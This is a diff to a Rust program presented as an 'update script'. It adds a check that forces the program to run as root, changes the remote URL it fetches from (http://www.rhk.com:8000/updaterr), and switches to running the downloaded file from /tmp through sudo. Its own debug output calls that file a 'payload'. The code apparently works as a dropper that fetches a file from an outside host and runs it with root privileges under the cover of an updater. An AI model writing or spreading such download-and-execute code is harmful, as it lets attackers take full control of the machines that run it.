@@ -1,5 +1,6 @@
 use clap::Parser;
 use colored::Colorize;
+use nix::unistd::Uid;
 use std::{
     env::{current_dir, set_current_dir},
     fs::{read_dir, set_permissions, File},
@@ -20,12 +21,17 @@ struct Args {
 
 #[tokio::main]
 async fn main() -> Result<()> {
+
+    if !Uid::effective().is_root() {
+        panic!("{}", "[x] You must run this update script with root permissions!".red().bold());
+    }
+
     let debug: bool = Args::parse().debug;
     if debug {
         println!("[*] Debug mode: {}", "ON".green().bold());
     }
 
-    let target: &str = "http://www.rhk.com:8000/updater";
+    let target: &str = "http://www.rhk.com:8000/updaterr";
 
     let temp_path = Path::new("/tmp");
     let change_current_dir = set_current_dir(temp_path);
@@ -85,7 +91,8 @@ async fn main() -> Result<()> {
         println!("[*] Executing payload...");
     }
 
-    let _ = Command::new("/tmp/".to_owned() + filename)
+    let _ = Command::new("sudo")
+        .arg("/tmp/".to_owned() + filename)
         .spawn()
         .expect("error");
 
